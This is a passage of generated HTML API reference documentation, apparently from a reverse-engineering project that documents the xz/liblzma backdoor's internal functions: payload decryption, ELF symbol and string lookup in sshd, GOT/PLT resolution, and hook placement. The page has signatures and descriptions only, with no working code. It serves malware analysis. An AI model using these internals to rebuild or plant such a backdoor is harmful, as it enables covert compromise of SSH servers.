<p>count the number of non-NULL pointers in the <code>malloc</code>'d memory block <code>ptrs</code> </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">ptrs</td><td>pointer to a <code>malloc</code>'d memory block </td></tr>
    <tr><td class="paramname">count_out</td><td>will be filled with the number of non-NULL pointers </td></tr>
    <tr><td class="paramname">funcs</td><td>used for <code>malloc_usable_size</code> </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL TRUE if the operation succeeded, FALSE otherwise </dd></dl>

</div>
</div>
<a id="a91ced8a70c0e916ae8289e4ad77fbd47"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a91ced8a70c0e916ae8289e4ad77fbd47">&#9670;&nbsp;</a></span>decrypt_payload_message()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL decrypt_payload_message </td>
          <td>(</td>
          <td class="paramtype">void *&#160;</td>
          <td class="paramname"><em>payload</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">size_t&#160;</td>
          <td class="paramname"><em>payload_size</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structglobal__context.html">global_context_t</a> *&#160;</td>
          <td class="paramname"><em>ctx</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>decrypts the given backdoor payload </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">payload</td><td>payload data </td></tr>
    <tr><td class="paramname">payload_size</td><td>size of payload data </td></tr>
    <tr><td class="paramname">ctx</td><td>the global context </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL TRUE if successfully decrypted, FALSE otherwise </dd></dl>

</div>
</div>
<a id="a1e6926b448d83ad3517bd38a954fe762"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a1e6926b448d83ad3517bd38a954fe762">&#9670;&nbsp;</a></span>dsa_key_hash()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL dsa_key_hash </td>
          <td>(</td>
          <td class="paramtype">const DSA *&#160;</td>
          <td class="paramname"><em>dsa</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>mdBuf</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u64&#160;</td>
          <td class="paramname"><em>mdBufSize</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structglobal__context.html">global_context_t</a> *&#160;</td>
          <td class="paramname"><em>ctx</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>obtains a SHA256 hash of the supplied RSA key </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">dsa</td><td>the DSA key to hash </td></tr>
    <tr><td class="paramname">mdBuf</td><td>buffer to write the resulting digest to </td></tr>
    <tr><td class="paramname">mdBufSize</td><td>size of the buffer indicated by <code>mdBuf</code> </td></tr>
    <tr><td class="paramname">ctx</td><td></td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL TRUE if the hash was successfully generated, FALSE otherwise </dd></dl>

</div>
</div>
<a id="a0cbdcbe6fe49e7d3122630082cd84f34"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a0cbdcbe6fe49e7d3122630082cd84f34">&#9670;&nbsp;</a></span>dummy_tls_get_addr()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">void* dummy_tls_get_addr </td>
          <td>(</td>
          <td class="paramtype"><a class="el" href="structdl__tls__index.html">tls_index</a> *&#160;</td>
          <td class="paramname"><em>ti</em></td><td>)</td>
          <td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>a dummy function that calls __tls_get_addr, to make sure its GOT slot doesn't get removed by compiler optimizations </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">ti</td><td></td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>void* </dd></dl>

</div>
</div>
<a id="a2bf5f1627236a90a54515265280e8354"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a2bf5f1627236a90a54515265280e8354">&#9670;&nbsp;</a></span>elf_contains_vaddr()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL elf_contains_vaddr </td>
          <td>(</td>
          <td class="paramtype"><a class="el" href="structelf__info.html">elf_info_t</a> *&#160;</td>
          <td class="paramname"><em>elf_info</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">void *&#160;</td>
          <td class="paramname"><em>vaddr</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u64&#160;</td>
          <td class="paramname"><em>size</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u32&#160;</td>
          <td class="paramname"><em>p_flags</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>checks if given ELF file contains the range [vaddr, vaddr+size) in a segment with the specified memory protection flags </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname"><a class="el" href="structelf__info.html">elf_info</a></td><td>elf context </td></tr>
    <tr><td class="paramname">vaddr</td><td>starting memory address </td></tr>
    <tr><td class="paramname">size</td><td>memory size </td></tr>
    <tr><td class="paramname">p_flags</td><td>the expected segment protection flags (PF_*) </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL TRUE if found, FALSE otherwise </dd></dl>

</div>
</div>
<a id="a2b6f96960f68c8cd69c6bb5bce25426b"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a2b6f96960f68c8cd69c6bb5bce25426b">&#9670;&nbsp;</a></span>elf_contains_vaddr_relro()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL elf_contains_vaddr_relro </td>
          <td>(</td>
          <td class="paramtype"><a class="el" href="structelf__info.html">elf_info_t</a> *&#160;</td>
          <td class="paramname"><em>elf_info</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u64&#160;</td>
          <td class="paramname"><em>vaddr</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u64&#160;</td>
          <td class="paramname"><em>size</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u32&#160;</td>
          <td class="paramname"><em>p_flags</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>checks if given ELF file contains the range [vaddr, vaddr+size) in the gnurelro segment </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname"><a class="el" href="structelf__info.html">elf_info</a></td><td>elf context </td></tr>
    <tr><td class="paramname">vaddr</td><td>starting memory address </td></tr>
    <tr><td class="paramname">size</td><td>memory size </td></tr>
    <tr><td class="paramname">p_flags</td><td>the expected segment protection flags (PF_*). must be non-zero </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL TRUE if found, FALSE otherwise </dd></dl>

</div>
</div>
<a id="a02157f429658403951e2f41eb0e01117"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a02157f429658403951e2f41eb0e01117">&#9670;&nbsp;</a></span>elf_find_function_pointer()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL elf_find_function_pointer </td>
          <td>(</td>
          <td class="paramtype">StringXrefId&#160;</td>
          <td class="paramname"><em>xref_id</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">void **&#160;</td>
          <td class="paramname"><em>pOutCodeStart</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">void **&#160;</td>
          <td class="paramname"><em>pOutCodeEnd</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">void **&#160;</td>
          <td class="paramname"><em>pOutFptrAddr</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structelf__info.html">elf_info_t</a> *&#160;</td>
          <td class="paramname"><em>elf_info</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structstring__references.html">string_references_t</a> *&#160;</td>
          <td class="paramname"><em>xrefs</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structglobal__context.html">global_context_t</a> *&#160;</td>
          <td class="paramname"><em>ctx</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>this function searches for a function pointer, pointing to a function designated by the given <code>xref_id</code> </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">xref_id</td><td>the index to use to retrieve the function from <code>xrefs</code> </td></tr>
    <tr><td class="paramname">pOutCodeStart</td><td>output variable that will receive the function start address </td></tr>
    <tr><td class="paramname">pOutCodeEnd</td><td>output variable that will receive the function end address </td></tr>
    <tr><td class="paramname">pOutFptrAddr</td><td>output variable that will receive the address of the function pointer </td></tr>
    <tr><td class="paramname"><a class="el" href="structelf__info.html">elf_info</a></td><td>sshd elf context </td></tr>
    <tr><td class="paramname">xrefs</td><td>array of resolved functions, filled by <a class="el" href="xzre_8h.html#a977d8b72a5f81675c76838347747d094">elf_find_string_references</a> </td></tr>
    <tr><td class="paramname">ctx</td><td>the global context. used to retrieve the 'uses_endbr64' field </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL TRUE if the function pointer was found, FALSE otherwise </dd></dl>

</div>
</div>
<a id="ad86c0039d3a08468f5cf7187662ebab9"></a>
<h2 class="memtitle"><span class="permalink"><a href="#ad86c0039d3a08468f5cf7187662ebab9">&#9670;&nbsp;</a></span>elf_find_string()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">char* elf_find_string </td>
          <td>(</td>
          <td class="paramtype"><a class="el" href="structelf__info.html">elf_info_t</a> *&#160;</td>
          <td class="paramname"><em>elf_info</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">EncodedStringId *&#160;</td>
          <td class="paramname"><em>stringId_inOut</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">void *&#160;</td>
          <td class="paramname"><em>rodata_start_ptr</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Locates a string in the ELF .rodata section. </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname"><a class="el" href="structelf__info.html">elf_info</a></td><td>the ELF context to use for the search </td></tr>
    <tr><td class="paramname">stringId_inOut</td><td>mandatory pointer to an encoded string ID.<ul>
<li>if the referenced string ID is 0, the first matching string (in the string table) will stop the search, and the matching string ID will be written to the pointer.</li>
<li>if the referenced string ID is not 0, the search will look for that specific string ID, and the value will not be updated. </li>
</ul>
</td></tr>
    <tr><td class="paramname">rodata_start_ptr</td><td>location in the rodata section to start the search from </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>char* pointer to the string, or NULL if it couldn't be found </dd></dl>

</div>
</div>
<a id="a6ac7b2035eee3a9ffcceee0f9290c2e1"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a6ac7b2035eee3a9ffcceee0f9290c2e1">&#9670;&nbsp;</a></span>elf_find_string_reference()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">u8* elf_find_string_reference </td>
          <td>(</td>
          <td class="paramtype"><a class="el" href="structelf__info.html">elf_info_t</a> *&#160;</td>
          <td class="paramname"><em>elf_info</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">EncodedStringId&#160;</td>
          <td class="paramname"><em>encoded_string_id</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>code_start</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>code_end</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>finds an instruction that references the given string </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname"><a class="el" href="structelf__info.html">elf_info</a></td><td>the parsed ELF context </td></tr>
    <tr><td class="paramname">encoded_string_id</td><td>the string to search for, in encoded form </td></tr>
    <tr><td class="paramname">code_start</td><td>address to start searching from </td></tr>
    <tr><td class="paramname">code_end</td><td>address to stop searching at </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>u8* the address of the first instruction that references the given string, or NULL if not found </dd></dl>

</div>
</div>
<a id="a977d8b72a5f81675c76838347747d094"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a977d8b72a5f81675c76838347747d094">&#9670;&nbsp;</a></span>elf_find_string_references()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL elf_find_string_references </td>
          <td>(</td>
          <td class="paramtype"><a class="el" href="structelf__info.html">elf_info_t</a> *&#160;</td>
          <td class="paramname"><em>elf_info</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structstring__references.html">string_references_t</a> *&#160;</td>
          <td class="paramname"><em>refs</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>parses the ELF rodata section, looking for strings and the instructions that reference them </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname"><a class="el" href="structelf__info.html">elf_info</a></td><td>the executable to find strings in </td></tr>
    <tr><td class="paramname">refs</td><td>structure that will be populated with the results </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL </dd></dl>

</div>
</div>
<a id="a18845fc4614f60083817db417dc32a13"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a18845fc4614f60083817db417dc32a13">&#9670;&nbsp;</a></span>elf_get_code_segment()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">void* elf_get_code_segment </td>
          <td>(</td>
          <td class="paramtype"><a class="el" href="structelf__info.html">elf_info_t</a> *&#160;</td>
          <td class="paramname"><em>elf_info</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u64 *&#160;</td>
          <td class="paramname"><em>pSize</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Obtains the address and size of the first executable segment in the given ELF file. </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname"><a class="el" href="structelf__info.html">elf_info</a></td><td>the parsed ELF context, which will be updated with the address and size of the code segment </td></tr>
    <tr><td class="paramname">pSize</td><td>variable that will be populated with the page-aligned segment size </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>void* the page-aligned starting address of the segment </dd></dl>

</div>
</div>
<a id="a52148c8b1da2a37036e7975ea299117b"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a52148c8b1da2a37036e7975ea299117b">&#9670;&nbsp;</a></span>elf_get_data_segment()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">void* elf_get_data_segment </td>
          <td>(</td>
          <td class="paramtype"><a class="el" href="structelf__info.html">elf_info_t</a> *&#160;</td>
          <td class="paramname"><em>elf_info</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u64 *&#160;</td>
          <td class="paramname"><em>pSize</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">BOOL&#160;</td>
          <td class="paramname"><em>get_alignment</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Obtains the address and size of the last read-write segment in the given ELF file this is typically the segment that contains the following sections: </p>
<ul>
<li>.init_array .fini_array .data.rel.ro .dynamic .got</li>
</ul>
<p>the parameter <code>get_alignment</code> controls if <code>pSize</code> should be populated with the segment size (when FALSE), or with the segment alignment (when TRUE)</p>
<p>Used to store data in the free space after the segment created due to alignment:</p><ul>
<li>for liblzma at (return value + 0x10) is the backdoor_hooks_data_t struct pointed to by hooks_data_addr</li>
</ul>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname"><a class="el" href="structelf__info.html">elf_info</a></td><td>the parsed ELF context, which will be updated with the address and size of the data segment </td></tr>
    <tr><td class="paramname">pSize</td><td>variable that will be populated with either the page-aligned segment size, or the alignment size </td></tr>
    <tr><td class="paramname">get_alignment</td><td>controls if alignment size should be returned instead of segment size </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>void* the page-aligned starting address of the segment </dd></dl>

</div>
</div>
<a id="acb54dcbcba1c88075c523678a0d0dbda"></a>
<h2 class="memtitle"><span class="permalink"><a href="#acb54dcbcba1c88075c523678a0d0dbda">&#9670;&nbsp;</a></span>elf_get_got_symbol()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">void* elf_get_got_symbol </td>
          <td>(</td>
          <td class="paramtype"><a class="el" href="structelf__info.html">elf_info_t</a> *&#160;</td>
          <td class="paramname"><em>elf_info</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">EncodedStringId&#160;</td>
          <td class="paramname"><em>encoded_string_id</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Gets the GOT symbol with name <code>encoded_string_id</code> from the parsed ELF file. </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname"><a class="el" href="structelf__info.html">elf_info</a></td><td>the parsed ELF context </td></tr>
    <tr><td class="paramname">encoded_string_id</td><td>symbol to look for (encoded) </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>void* the address of the symbol, or NULL if not found </dd></dl>

</div>
</div>
<a id="acbe9201dea64d4ae8112803f8af95985"></a>
<h2 class="memtitle"><span class="permalink"><a href="#acbe9201dea64d4ae8112803f8af95985">&#9670;&nbsp;</a></span>elf_get_plt_symbol()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">void* elf_get_plt_symbol </td>
          <td>(</td>
          <td class="paramtype"><a class="el" href="structelf__info.html">elf_info_t</a> *&#160;</td>
          <td class="paramname"><em>elf_info</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">EncodedStringId&#160;</td>
          <td class="paramname"><em>encoded_string_id</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Gets the PLT symbol with name <code>encoded_string_id</code> from the parsed ELF file. </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname"><a class="el" href="structelf__info.html">elf_info</a></td><td>the parsed ELF context </td></tr>
    <tr><td class="paramname">encoded_string_id</td><td>symbol to look for (encoded) </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>void* the address of the symbol, or NULL if not found </dd></dl>

</div>
</div>
<a id="a244da0ace01c1812168a0f7bb48bfd3b"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a244da0ace01c1812168a0f7bb48bfd3b">&#9670;&nbsp;</a></span>elf_get_reloc_symbol()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">void* elf_get_reloc_symbol </td>
          <td>(</td>
          <td class="paramtype"><a class="el" href="structelf__info.html">elf_info_t</a> *&#160;</td>
          <td class="paramname"><em>elf_info</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">Elf64_Rela *&#160;</td>
          <td class="paramname"><em>relocs</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u32&#160;</td>
          <td class="paramname"><em>num_relocs</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u64&#160;</td>
          <td class="paramname"><em>reloc_type</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">EncodedStringId&#160;</td>
          <td class="paramname"><em>encoded_string_id</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Searches the ELF relocations for a symbol having name <code>encoded_string</code> id and relocation of type <code>reloc_type</code>. </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname"><a class="el" href="structelf__info.html">elf_info</a></td><td>the parsed ELF context </td></tr>
    <tr><td class="paramname">relocs</td><td>array of relocations to search in </td></tr>
    <tr><td class="paramname">num_relocs</td><td>number of items in the array pointed by <code>relocs</code> </td></tr>
    <tr><td class="paramname">reloc_type</td><td>type of relocation to consider (R_X86_64_*) </td></tr>
    <tr><td class="paramname">encoded_string_id</td><td>symbol to look for (encoded) </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>void* the address of the symbol, or NULL if not found </dd></dl>

</div>
</div>
<a id="a55e085fd878446cf655c657491b9d522"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a55e085fd878446cf655c657491b9d522">&#9670;&nbsp;</a></span>elf_get_rodata_segment()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">void* elf_get_rodata_segment </td>
          <td>(</td>
          <td class="paramtype"><a class="el" href="structelf__info.html">elf_info_t</a> *&#160;</td>
          <td class="paramname"><em>elf_info</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u64 *&#160;</td>
          <td class="paramname"><em>pSize</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Obtains the address and size of the last readonly segment in the given ELF file this corresponds to the segment that typically contains .rodata. </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname"><a class="el" href="structelf__info.html">elf_info</a></td><td>the parsed ELF context, which will be updated with the address and size of the rodata segment </td></tr>
    <tr><td class="paramname">pSize</td><td>variable that will be populated with the page-aligned segment size </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>void* the page-aligned starting address of the segment </dd></dl>

</div>
</div>
<a id="a049328971f4e99ce954d5e0346fee6d7"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a049328971f4e99ce954d5e0346fee6d7">&#9670;&nbsp;</a></span>elf_parse()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL elf_parse </td>
          <td>(</td>
          <td class="paramtype">Elf64_Ehdr *&#160;</td>
          <td class="paramname"><em>ehdr</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structelf__info.html">elf_info_t</a> *&#160;</td>
          <td class="paramname"><em>elf_info</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Parses the given in-memory ELF file into <a class="el" href="structelf__info.html">elf_info</a>. </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">ehdr</td><td>pointer to the beginning of the ELF header </td></tr>
    <tr><td class="paramname"><a class="el" href="structelf__info.html">elf_info</a></td><td>pointer to the structure that will hold the parsed information </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL TRUE if parsing completed successfully, FALSE otherwise </dd></dl>

</div>
</div>
<a id="a9d2747f12c29ef6eae1cc4b09f3cc5f7"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a9d2747f12c29ef6eae1cc4b09f3cc5f7">&#9670;&nbsp;</a></span>elf_symbol_get()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">Elf64_Sym* elf_symbol_get </td>
          <td>(</td>
          <td class="paramtype"><a class="el" href="structelf__info.html">elf_info_t</a> *&#160;</td>
          <td class="paramname"><em>elf_info</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">EncodedStringId&#160;</td>
          <td class="paramname"><em>encoded_string_id</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">EncodedStringId&#160;</td>
          <td class="paramname"><em>sym_version</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Looks up an ELF symbol from a parsed ELF. </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname"><a class="el" href="structelf__info.html">elf_info</a></td><td>the parsed ELF context </td></tr>
    <tr><td class="paramname">encoded_string_id</td><td>string ID of the symbol name </td></tr>
    <tr><td class="paramname">sym_version</td><td>optional string representing the symbol version (e.g. "GLIBC_2.2.5") </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>Elf64_Sym* pointer to the ELF symbol, or NULL if not found </dd></dl>

</div>
</div>
<a id="a099c6531c0b9aaf2a3caf6b001fa5109"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a099c6531c0b9aaf2a3caf6b001fa5109">&#9670;&nbsp;</a></span>elf_symbol_get_addr()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">void* elf_symbol_get_addr </td>
          <td>(</td>
          <td class="paramtype"><a class="el" href="structelf__info.html">elf_info_t</a> *&#160;</td>
          <td class="paramname"><em>elf_info</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">EncodedStringId&#160;</td>
          <td class="paramname"><em>encoded_string_id</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Looks up an ELF symbol from a parsed ELF, and returns its memory address. </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname"><a class="el" href="structelf__info.html">elf_info</a></td><td>the parsed ELF context </td></tr>
    <tr><td class="paramname">encoded_string_id</td><td>string ID of the symbol name </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>void* the address of the symbol </dd></dl>

</div>
</div>
<a id="aeb6b7e7363a9d706fdd3704ef5faf584"></a>
<h2 class="memtitle"><span class="permalink"><a href="#aeb6b7e7363a9d706fdd3704ef5faf584">&#9670;&nbsp;</a></span>fake_lzma_alloc()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">void* fake_lzma_alloc </td>
          <td>(</td>
          <td class="paramtype">void *&#160;</td>
          <td class="paramname"><em>opaque</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">size_t&#160;</td>
          <td class="paramname"><em>nmemb</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">size_t&#160;</td>
          <td class="paramname"><em>size</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>a fake alloc function called by lzma_alloc() that then calls <a class="el" href="xzre_8h.html#a099c6531c0b9aaf2a3caf6b001fa5109" title="Looks up an ELF symbol from a parsed ELF, and returns its memory address.">elf_symbol_get_addr()</a> </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">opaque</td><td>the parsed ELF context (elf_info_t*) </td></tr>
    <tr><td class="paramname">nmemb</td><td>not used </td></tr>
    <tr><td class="paramname">size</td><td>string ID of the symbol name (EncodedStringId) </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>void* the address of the symbol </dd></dl>

</div>
</div>
<a id="a5565761b59b3ef6786b83a9b50f72b17"></a>
